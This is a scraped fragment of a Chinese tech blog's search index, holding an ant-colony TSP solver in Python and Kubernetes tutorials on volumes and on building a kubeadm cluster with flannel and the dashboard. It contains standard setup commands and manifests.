    416,626,42,271,359,163,508,229,576,147,560,35,714,
    757,517,64,314,675,690,391,628,87,240,705,699,258,
    428,614,36,360,482,666,597,209,201,492,294]
distance_y = [
    170,395,198,151,242,556,57,401,305,421,267,105,525,
    381,244,330,395,169,141,380,153,442,528,329,232,48,
    498,265,343,120,165,50,433,63,491,275,348,222,288,
    490,213,524,244,114,104,552,70,425,227,331]
#城市距离和信息素
distance_graph = [ [0.0 for col in range(city_num)] for raw in range(city_num)]
pheromone_graph = [ [1.0 for col in range(city_num)] for raw in range(city_num)]



#----------- 蚂蚁 -----------
class Ant(object):

    # 初始化
    def __init__(self,ID):

        self.ID = ID                 # ID
        self.__clean_data()          # 随机初始化出生点

    # 初始数据
    def __clean_data(self):

        self.path = []               # 当前蚂蚁的路径           
        self.total_distance = 0.0    # 当前路径的总距离
        self.move_count = 0          # 移动次数
        self.current_city = -1       # 当前停留的城市
        self.open_table_city = [True for i in range(city_num)] # 探索城市的状态

        city_index = random.randint(0,city_num-1) # 随机初始出生点
        self.current_city = city_index
        self.path.append(city_index)
        self.open_table_city[city_index] = False
        self.move_count = 1

    # 选择下一个城市
    def __choice_next_city(self):

        next_city = -1
        select_citys_prob = [0.0 for i in range(city_num)]  #存储去下个城市的概率
        total_prob = 0.0

        # 获取去下一个城市的概率
        for i in range(city_num):
            if self.open_table_city[i]:
                try :
                    # 计算概率：与信息素浓度成正比，与距离成反比
                    select_citys_prob[i] = pow(pheromone_graph[self.current_city][i], ALPHA) * pow((1.0/distance_graph[self.current_city][i]), BETA)
                    total_prob += select_citys_prob[i]
                except ZeroDivisionError as e:
                    print (&#39;Ant ID: {ID}, current city: {current}, target city: {target}&#39;.format(ID = self.ID, current = self.current_city, target = i))
                    sys.exit(1)

        # 轮盘选择城市
        if total_prob &amp;gt; 0.0:
            # 产生一个随机概率,0.0-total_prob
            temp_prob = random.uniform(0.0, total_prob)
            for i in range(city_num):
                if self.open_table_city[i]:
                    # 轮次相减
                    temp_prob -= select_citys_prob[i]
                    if temp_prob &amp;lt; 0.0:
                        next_city = i
                        break

        # 未从概率产生，顺序选择一个未访问城市
        # if next_city == -1:
        #     for i in range(city_num):
        #         if self.open_table_city[i]:
        #             next_city = i
        #             break

        if (next_city == -1):
            next_city = random.randint(0, city_num - 1)
            while ((self.open_table_city[next_city]) == False):  # if==False,说明已经遍历过了
                next_city = random.randint(0, city_num - 1)

        # 返回下一个城市序号
        return next_city

    # 计算路径总距离
    def __cal_total_distance(self):

        temp_distance = 0.0

        for i in range(1, city_num):
            start, end = self.path[i], self.path[i-1]
            temp_distance += distance_graph[start][end]

        # 回路
        end = self.path[0]
        temp_distance += distance_graph[start][end]
        self.total_distance = temp_distance


    # 移动操作
    def __move(self, next_city):

        self.path.append(next_city)
        self.open_table_city[next_city] = False
        self.total_distance += distance_graph[self.current_city][next_city]
        self.current_city = next_city
        self.move_count += 1

    # 搜索路径
    def search_path(self):

        # 初始化数据
        self.__clean_data()

        # 搜素路径，遍历完所有城市为止
        while self.move_count &amp;lt; city_num:
            # 移动到下一个城市
            next_city =  self.__choice_next_city()
            self.__move(next_city)

        # 计算路径总长度
        self.__cal_total_distance()

#----------- TSP问题 -----------

class TSP(object):

    def __init__(self, root, width = 800, height = 600, n = city_num):

        # 创建画布
        self.root = root                               
        self.width = width      
        self.height = height
        # 城市数目初始化为city_num
        self.n = n
        # tkinter.Canvas
        self.canvas = tkinter.Canvas(
                root,
                width = self.width,
                height = self.height,
                bg = &amp;quot;#EBEBEB&amp;quot;,             # 背景白色 
                xscrollincrement = 1,
                yscrollincrement = 1
            )
        self.canvas.pack(expand = tkinter.YES, fill = tkinter.BOTH)
        self.title(&amp;quot;TSP蚁群算法(n:初始化 e:开始搜索 s:停止搜索 q:退出程序)&amp;quot;)
        self.__r = 5
        self.__lock = threading.RLock()     # 线程锁

        self.__bindEvents()
        self.new()

        # 计算城市之间的距离
        for i in range(city_num):
            for j in range(city_num):
                temp_distance = pow((distance_x[i] - distance_x[j]), 2) + pow((distance_y[i] - distance_y[j]), 2)
                temp_distance = pow(temp_distance, 0.5)
                distance_graph[i][j] =float(int(temp_distance + 0.5))

    # 按键响应程序
    def __bindEvents(self):

        self.root.bind(&amp;quot;q&amp;quot;, self.quite)        # 退出程序
        self.root.bind(&amp;quot;n&amp;quot;, self.new)          # 初始化
        self.root.bind(&amp;quot;e&amp;quot;, self.search_path)  # 开始搜索
        self.root.bind(&amp;quot;s&amp;quot;, self.stop)         # 停止搜索

    # 更改标题
    def title(self, s):

        self.root.title(s)

    # 初始化
    def new(self, evt = None):

        # 停止线程
        self.__lock.acquire()
        self.__running = False
        self.__lock.release()

        self.clear()     # 清除信息 
        self.nodes = []  # 节点坐标
        self.nodes2 = [] # 节点对象

        # 初始化城市节点
        for i in range(len(distance_x)):
            # 在画布上随机初始坐标
            x = distance_x[i]
            y = distance_y[i]
            self.nodes.append((x, y))
            # 生成节点椭圆，半径为self.__r
            node = self.canvas.create_oval(x - self.__r,
                    y - self.__r, x + self.__r, y + self.__r,
                    fill = &amp;quot;#ff0000&amp;quot;,      # 填充红色
                    outline = &amp;quot;#000000&amp;quot;,   # 轮廓白色
                    tags = &amp;quot;node&amp;quot;,
                )
            self.nodes2.append(node)
            # 显示坐标
            self.canvas.create_text(x,y-10,              # 使用create_text方法在坐标（302，77）处绘制文字
                    text = &#39;(&#39;+str(x)+&#39;,&#39;+str(y)+&#39;)&#39;,    # 所绘制文字的内容
                    fill = &#39;black&#39;                       # 所绘制文字的颜色为灰色
                )

        # 顺序连接城市
        #self.line(range(city_num))

        # 初始城市之间的距离和信息素
        for i in range(city_num):
            for j in range(city_num):
                pheromone_graph[i][j] = 1.0

        self.ants = [Ant(ID) for ID in range(ant_num)]  # 初始蚁群
        self.best_ant = Ant(-1)                          # 初始最优解
        self.best_ant.total_distance = 1 &amp;lt;&amp;lt; 31           # 初始最大距离
        self.iter = 1                                    # 初始化迭代次数 

    # 将节点按order顺序连线
    def line(self, order):
        # 删除原线
        self.canvas.delete(&amp;quot;line&amp;quot;)
        def line2(i1, i2):
            p1, p2 = self.nodes[i1], self.nodes[i2]
            self.canvas.create_line(p1, p2, fill = &amp;quot;#000000&amp;quot;, tags = &amp;quot;line&amp;quot;)
            return i2

        # order[-1]为初始值
        reduce(line2, order, order[-1])

    # 清除画布
    def clear(self):
        for item in self.canvas.find_all():
            self.canvas.delete(item)

    # 退出程序
    def quite(self, evt):
        self.__lock.acquire()
        self.__running = False
        self.__lock.release()
        self.root.destroy()
        print (u&amp;quot;\n程序已退出...&amp;quot;)
        sys.exit()

    # 停止搜索
    def stop(self, evt):
        self.__lock.acquire()
        self.__running = False
        self.__lock.release()

    # 开始搜索
    def search_path(self, evt = None):

        # 开启线程
        self.__lock.acquire()
        self.__running = True
        self.__lock.release()

        while self.__running:
            # 遍历每一只蚂蚁
            for ant in self.ants:
                # 搜索一条路径
                ant.search_path()
                # 与当前最优蚂蚁比较
                if ant.total_distance &amp;lt; self.best_ant.total_distance:
                    # 更新最优解
                    self.best_ant = copy.deepcopy(ant)
            # 更新信息素
            self.__update_pheromone_gragh()
            print (u&amp;quot;迭代次数：&amp;quot;,self.iter,u&amp;quot;最佳路径总距离：&amp;quot;,int(self.best_ant.total_distance))
            # 连线
            self.line(self.best_ant.path)
            # 设置标题
            self.title(&amp;quot;TSP蚁群算法(n:随机初始 e:开始搜索 s:停止搜索 q:退出程序) 迭代次数: %d&amp;quot; % self.iter)
            # 更新画布
            self.canvas.update()
            self.iter += 1

    # 更新信息素
    def __update_pheromone_gragh(self):

        # 获取每只蚂蚁在其路径上留下的信息素
        temp_pheromone = [[0.0 for col in range(city_num)] for raw in range(city_num)]
        for ant in self.ants:
            for i in range(1,city_num):
                start, end = ant.path[i-1], ant.path[i]
                # 在路径上的每两个相邻城市间留下信息素，与路径总距离反比
                temp_pheromone[start][end] += Q / ant.total_distance
                temp_pheromone[end][start] = temp_pheromone[start][end]

        # 更新所有城市之间的信息素，旧信息素衰减加上新迭代信息素
        for i in range(city_num):
            for j in range(city_num):
                pheromone_graph[i][j] = pheromone_graph[i][j] * RHO + temp_pheromone[i][j]

    # 主循环
    def mainloop(self):
        self.root.mainloop()

#----------- 程序的入口处 -----------

if __name__ == &#39;__main__&#39;:


    TSP(tkinter.Tk()).mainloop()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;遗传算法&#34;&gt;遗传算法&lt;/h3&gt;
&lt;h3 id=&#34;微粒群算法&#34;&gt;微粒群算法&lt;/h3&gt;
">蚁群、遗传、微粒群</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/k8s-juan/"" data-c="
          &lt;p&gt;k8s中卷是pod的一个组成部分，它不是一个独立的对象，所以不能单独创建和删除。&lt;br&gt;
pod中所有容器都可以使用卷，但必须先将它挂载在每个需要访问它的容器中。&lt;br&gt;
每个容器可以在其文件系统的任意位置挂载卷。&lt;/p&gt;
&lt;p&gt;可创建挂载的卷的类型有多种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;emptyDir：用于存储临时数据的简单空目录。&lt;/li&gt;
&lt;li&gt;hostPath：用于将目录从工作节点的文件系统挂载到pod中。&lt;/li&gt;
&lt;li&gt;gitRepo：通过检出Git仓库的内容来初始化的卷。&lt;/li&gt;
&lt;li&gt;nfs：挂载到pod中的NFS的共享卷。&lt;/li&gt;
&lt;li&gt;....&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;emptyDir&lt;/strong&gt;是最简单的卷类型，其它类型都是在它的基础上构建的。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;volumes:
- name: name
  emptyDir: {}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;gitRepo&lt;/strong&gt;卷基本上也是一个emptyDir卷，它通过克隆Git仓库并在pod启动时(但在容器创建前)检出特定版本来填充数据。但不会跟着Git仓库的代码同步更新。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;volumes:
- name: html
  gitRepo:
    repository: https://gihub.com//....
    revision: master
    directory: . # 将repo克隆到卷的根目录
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;hostPath&lt;/strong&gt;一般是由某些系统级的pod进行访问，一般普通业务pod不应该去操作宿主机上的文件系统。这种类型的卷不会随着pod的删除而删除。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;到现在为止其实有一个问题，就是上面的的存储卷类型要么是会随着pod的删除而删除，要么就是只绑定到pod所在的宿主机上，一旦pod发生漂移，那么数据就会找不到，因此必须将其存储在某种类型的网络存储(NAS)中。&lt;br&gt;
首先创建一个运行MongoDB的pod，并创建适当类型的卷挂载到MongoDB容器中。这里的适当类型的卷可以用GCE持久磁盘。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;volumes:
- name: mongodb-data # 卷名
  gcePersisitentDisk: # 卷类型是GCE持久磁盘
    pdName: mongodb # 持久磁盘的名称必须与先前创建的实际PD一致
    fsType: ext4 # 文件系统类型为EXT4，一种linux文件系统
containers:
- image: mongo
  name: mongodb
  volumeMounts:
  - name: mongodb-data # 与上面的卷名一致
    mountPath: /data/db # MongoDB数据存放的路径
  ports:
  - containerPort: 27017
    protocol: TCP
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;pod包含一个容器和一个卷，被之前创建的GCE持久磁盘支持。因为MongoDB就是在/data/db上存储数据的，所以容器中的卷也要挂载在这个路径上。&lt;br&gt;
然后其它pod通过向MongoDB数据库添加文档来将数据写入持久化存储。&lt;/p&gt;
">【k8s】卷</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/k8s-k8s-huan-jing-da-jian/"" data-c="
          &lt;p&gt;kubeadm是官方社区推出的一个用于快速部署kubernetes集群的工具。&lt;/p&gt;
&lt;p&gt;这个工具能通过两条指令完成一个kubernetes集群的部署：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 创建一个 Master 节点
kubeadm init

# 将一个 Node 节点加入到当前集群中
kubeadm join &amp;lt;Master节点的IP和端口 &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;1-安装要求&#34;&gt;1. 安装要求&lt;/h2&gt;
&lt;p&gt;在开始之前，部署Kubernetes集群机器需要满足以下几个条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一台或多台机器，操作系统 CentOS7.x-86_x64&lt;/li&gt;
&lt;li&gt;硬件配置：2GB或更多RAM，2个CPU或更多CPU，硬盘30GB或更多&lt;/li&gt;
&lt;li&gt;可以访问外网，需要拉取镜像，如果服务器不能上网，需要提前下载镜像并导入节点&lt;/li&gt;
&lt;li&gt;禁止swap分区&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-准备环境&#34;&gt;2. 准备环境&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;角色&lt;/th&gt;
&lt;th&gt;IP&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;master&lt;/td&gt;
&lt;td&gt;10.0.0.200&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;node1&lt;/td&gt;
&lt;td&gt;10.0.0.201&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;node2&lt;/td&gt;
&lt;td&gt;10.0.0.202&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code&gt;# 关闭防火墙
systemctl stop firewalld
systemctl disable firewalld

# 关闭selinux
sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config  # 永久
setenforce 0  # 临时

# 关闭swap
swapoff -a  # 临时
sed -ri &#39;s/.*swap.*/#&amp;amp;/&#39; /etc/fstab    # 永久

# 根据规划设置主机名
# master
hostnamectl set-hostname master
# node1
hostnamectl set-hostname node1
# node2
hostnamectl set-hostname node2

# 在master添加hosts
cat &amp;gt;&amp;gt; /etc/hosts &amp;lt;&amp;lt; EOF
10.0.0.200 master
10.0.0.201 node1
10.0.0.202 node2
EOF

# 将桥接的IPv4流量传递到iptables的链
cat &amp;gt; /etc/sysctl.d/k8s.conf &amp;lt;&amp;lt; EOF
net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
EOF
sysctl --system  # 生效

# 时间同步
yum install ntpdate -y
ntpdate time.windows.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-所有节点安装dockerkubeadmkubelet&#34;&gt;3. 所有节点安装Docker/kubeadm/kubelet&lt;/h2&gt;
&lt;p&gt;Kubernetes默认CRI（容器运行时）为Docker，因此先安装Docker。&lt;/p&gt;
&lt;h3 id=&#34;31-安装docker&#34;&gt;3.1 安装Docker&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;yum install -y wget
wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo

yum -y install docker
systemctl enable docker &amp;amp;&amp;amp; systemctl start docker
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /etc/docker/daemon.json &amp;lt;&amp;lt; EOF
{
  &amp;quot;registry-mirrors&amp;quot;: [&amp;quot;https://b9pmyelo.mirror.aliyuncs.com&amp;quot;]
}
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;32-添加阿里云yum软件源&#34;&gt;3.2 添加阿里云YUM软件源&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ cat &amp;gt; /etc/yum.repos.d/kubernetes.repo &amp;lt;&amp;lt; EOF
[kubernetes]
name=Kubernetes
baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64
enabled=1
gpgcheck=0
repo_gpgcheck=0
gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;33-安装kubeadmkubelet和kubectl&#34;&gt;3.3 安装kubeadm，kubelet和kubectl&lt;/h3&gt;
&lt;p&gt;由于版本更新频繁，这里可以指定版本号部署：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 指定版本号，若不指定为latest
# yum install -y kubelet-1.16.3 kubeadm-1.16.3 kubectl-1.16.3 

yum install -y kubelet kubeadm kubectl

systemctl enable kubelet &amp;amp;&amp;amp; systemctl start kubelet
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-部署kubernetes-master&#34;&gt;4. 部署Kubernetes Master&lt;/h2&gt;
&lt;p&gt;在Master执行。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kubeadm init --apiserver-advertise-address=10.0.0.200 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.20.4 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16
  
  # --apiserver-advertise-address API服务器所公布的其正在监听的IP地址
  # --image-repository 选择用于拉取控制平面镜像的容器仓库，由于默认拉取镜像地址k8s.gcr.io国内无法访问，这里指定阿里云镜像仓库地址。
  # --kubernetes-version 如果上方安装kubelet没有指定版本号，这里也可不指定，需要注意不同版本之间的兼容，不兼容会有报错，指定兼容版本即可。
  # --service-cidr 为服务的虚拟 IP 地址另外指定 IP 地址段
  # --pod-network-cidr 指明 pod 网络可以使用的 IP 地址段。
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;如果提示找不到coredns:v1.8.0，就先在kubeadm init后加 --ignore-preflight-errors=all忽略报错。kubeadm init结束后，继续后面的步骤。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用kubectl工具：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown $(id -u):$(id -g) $HOME/.kube/config
$ kubectl get nodes
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;5-加入kubernetes-node&#34;&gt;5. 加入Kubernetes Node&lt;/h2&gt;
&lt;p&gt;在Node执行。&lt;/p&gt;
&lt;p&gt;向集群添加新节点，执行在kubeadm init输出的kubeadm join命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kubeadm join 192.168.1.11:6443 --token esce21.q6hetwm8si29qxwn \
    --discovery-token-ca-cert-hash sha256:00603a05805807501d7181c3d60b478788408cfe6cedefedb1f97569708be9c5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;默认token有效期为24小时，当过期之后，该token就不可用了。这时就需要重新创建token，操作如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kubeadm token create --print-join-command
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;6-部署cni网络插件&#34;&gt;6. 部署CNI网络插件&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;vi kube-flannel.yml

---
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: psp.flannel.unprivileged
  annotations:
    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default
    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default
    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default
    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default
spec:
  privileged: false
  volumes:
    - configMap
    - secret
    - emptyDir
    - hostPath
  allowedHostPaths:
    - pathPrefix: &amp;quot;/etc/cni/net.d&amp;quot;
    - pathPrefix: &amp;quot;/etc/kube-flannel&amp;quot;
    - pathPrefix: &amp;quot;/run/flannel&amp;quot;
  readOnlyRootFilesystem: false
  # Users and groups
  runAsUser:
    rule: RunAsAny
  supplementalGroups:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny
  # Privilege Escalation
  allowPrivilegeEscalation: false
  defaultAllowPrivilegeEscalation: false
  # Capabilities
  allowedCapabilities: [&#39;NET_ADMIN&#39;]
  defaultAddCapabilities: []
  requiredDropCapabilities: []
  # Host namespaces
  hostPID: false
  hostIPC: false
  hostNetwork: true
  hostPorts:
  - min: 0
    max: 65535
  # SELinux
  seLinux:
    # SELinux is unsed in CaaSP
    rule: &#39;RunAsAny&#39;
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: flannel
rules:
  - apiGroups: [&#39;extensions&#39;]
    resources: [&#39;podsecuritypolicies&#39;]
    verbs: [&#39;use&#39;]
    resourceNames: [&#39;psp.flannel.unprivileged&#39;]
  - apiGroups:
      - &amp;quot;&amp;quot;
    resources:
      - pods
    verbs:
      - get
  - apiGroups:
      - &amp;quot;&amp;quot;
    resources:
      - nodes
    verbs:
      - list
      - watch
  - apiGroups:
      - &amp;quot;&amp;quot;
    resources:
      - nodes/status
    verbs:
      - patch
---
kind: ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1beta1
metadata:
  name: flannel
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: flannel
subjects:
- kind: ServiceAccount
  name: flannel
  namespace: kube-system
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: flannel
  namespace: kube-system
---
kind: ConfigMap
apiVersion: v1
metadata:
  name: kube-flannel-cfg
  namespace: kube-system
  labels:
    tier: node
    app: flannel
data:
  cni-conf.json: |
    {
      &amp;quot;cniVersion&amp;quot;: &amp;quot;0.2.0&amp;quot;,
      &amp;quot;name&amp;quot;: &amp;quot;cbr0&amp;quot;,
      &amp;quot;plugins&amp;quot;: [
        {
          &amp;quot;type&amp;quot;: &amp;quot;flannel&amp;quot;,
          &amp;quot;delegate&amp;quot;: {
            &amp;quot;hairpinMode&amp;quot;: true,
            &amp;quot;isDefaultGateway&amp;quot;: true
          }
        },
        {
          &amp;quot;type&amp;quot;: &amp;quot;portmap&amp;quot;,
          &amp;quot;capabilities&amp;quot;: {
            &amp;quot;portMappings&amp;quot;: true
          }
        }
      ]
    }
  net-conf.json: |
    {
      &amp;quot;Network&amp;quot;: &amp;quot;10.244.0.0/16&amp;quot;,
      &amp;quot;Backend&amp;quot;: {
        &amp;quot;Type&amp;quot;: &amp;quot;vxlan&amp;quot;
      }
    }
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-flannel-ds-amd64
  namespace: kube-system
  labels:
    tier: node
    app: flannel
spec:
  selector:
    matchLabels:
      app: flannel
  template:
    metadata:
      labels:
        tier: node
        app: flannel
    spec:
      affinity:
        nodeAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
              - matchExpressions:
                  - key: beta.kubernetes.io/os
                    operator: In
                    values:
                      - linux
                  - key: beta.kubernetes.io/arch
                    operator: In
                    values:
                      - amd64
      hostNetwork: true
      tolerations:
      - operator: Exists
        effect: NoSchedule
      serviceAccountName: flannel
      initContainers:
      - name: install-cni
        image: lizhenliang/flannel:v0.11.0-amd64 
        command:
        - cp
        args:
        - -f
        - /etc/kube-flannel/cni-conf.json
        - /etc/cni/net.d/10-flannel.conflist
        volumeMounts:
        - name: cni
          mountPath: /etc/cni/net.d
        - name: flannel-cfg
          mountPath: /etc/kube-flannel/
      containers:
      - name: kube-flannel
        image: lizhenliang/flannel:v0.11.0-amd64 
        command:
        - /opt/bin/flanneld
        args:
        - --ip-masq
        - --kube-subnet-mgr
        resources:
          requests:
            cpu: &amp;quot;100m&amp;quot;
            memory: &amp;quot;50Mi&amp;quot;
          limits:
            cpu: &amp;quot;100m&amp;quot;
            memory: &amp;quot;50Mi&amp;quot;
        securityContext:
          privileged: false
          capabilities:
             add: [&amp;quot;NET_ADMIN&amp;quot;]
        env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        - name: POD_NAMESPACE
          valueFrom:
            fieldRef:
              fieldPath: metadata.namespace
        volumeMounts:
        - name: run
          mountPath: /run/flannel
        - name: flannel-cfg
          mountPath: /etc/kube-flannel/
      volumes:
        - name: run
          hostPath:
            path: /run/flannel
        - name: cni
          hostPath:
            path: /etc/cni/net.d
        - name: flannel-cfg
          configMap:
            name: kube-flannel-cfg


kubectl apply -f kube-flannel.yml

kubectl get pods -n kube-system
NAME                             READY   STATUS    RESTARTS   AGE
coredns-7f89b7bc75-5bk98         1/1     Running   0          22m
coredns-7f89b7bc75-cz8vq         1/1     Running   0          22m
etcd-master                      1/1     Running   0          22m
kube-apiserver-master            1/1     Running   0          22m
kube-controller-manager-master   1/1     Running   0          22m
kube-flannel-ds-amd64-2cpdk      1/1     Running   0          7m3s
kube-flannel-ds-amd64-4xntj      1/1     Running   0          7m3s
kube-flannel-ds-amd64-khqfw      1/1     Running   0          7m3s
kube-proxy-7rc7h                 1/1     Running   0          22m
kube-proxy-fncg8                 1/1     Running   0          16m
kube-proxy-rd6kl                 1/1     Running   0          16m
kube-scheduler-master            1/1     Running   0          22m

kubectl get pod -n kube-system -o wide

&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;在kubectl get pods -n kube-system，如果发现有ImagePullBackOff或者ErrImagePull，例如coredns-545d6fc579-4jw9w镜像是ImagePullBackOff状态，那么执行&lt;br&gt;
kubectl get pods coredns-545d6fc579-4jw9w -n kube-system -o yaml | grep image:&lt;br&gt;
查看没有拉去下来的镜像的全称，例如：&lt;br&gt;
registry.aliyuncs.com/google_containers/coredns/coredns:v1.8.0无法下载下来，然后手动docker pull拉取下来(有时候只是镜像的命名问题而提示找不到镜像)：docker pull coredns/coredns:1.8.0，然后手动将拉去下来的镜像改以下tag:&lt;br&gt;
sudo docker tag coredns/coredns:1.8.0  registry.aliyuncs.com/google_containers/coredns/coredns:v1.8.0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;7-测试kubernetes集群&#34;&gt;7. 测试kubernetes集群&lt;/h2&gt;
&lt;p&gt;在Kubernetes集群中创建一个pod，验证是否正常运行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kubectl create deployment nginx --image=nginx
$ kubectl expose deployment nginx --port=80 --type=NodePort
$ kubectl get pod,svc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问地址：&lt;code&gt;http://NodeIP:Port&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;8-安装dashboard&#34;&gt;8. 安装dashboard&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载yaml&lt;br&gt;
&lt;code&gt;wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.4/aio/deploy/recommended.yaml&lt;/code&gt;&lt;br&gt;
&lt;a href=&#34;https://www.cnblogs.com/LMIx/p/14477299.html&#34;&gt;关于raw.githubusercontent.com failed: Connection&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改yaml&lt;br&gt;
&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222100336-1778831657.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行安装&lt;br&gt;
&lt;code&gt;kubectl apply -f recommended.yaml&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建 serviceaccount&lt;br&gt;
&lt;code&gt;kubectl create serviceaccount dashboard-admin -n kube-system&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建clusterrolebinding为dashboard sa授权集群权限cluster-admin&lt;br&gt;
&lt;code&gt;kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin --serviceaccount=kube-system:dashboard-admin&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看dashboard所在node 可以用&lt;code&gt;kubectl get pods -A -o wide &lt;/code&gt;,然后找到dashboard 所在的node节点.&lt;br&gt;
&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222344433-155445658.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
使用token 登陆,获取token:&lt;code&gt;kubectl describe secrets -n kube-system $(kubectl -n kube-system get secret | awk &#39;/dashboard-admin/{print $1}&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222405372-1143767227.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://img2020.cnblogs.com/blog/1129222/202103/1129222-20210303222409587-1300734287.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;关于dashboard的pod一直处于pending状态：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kubectl delete -f recommended.yaml

vi recommended.yaml

将所有
nodeSelector:
  &amp;quot;kubernetes.io/os&amp;quot;: linux
注释掉

kubectl apply -f recommended.yaml
&lt;/code&gt;&lt;/pre&gt;
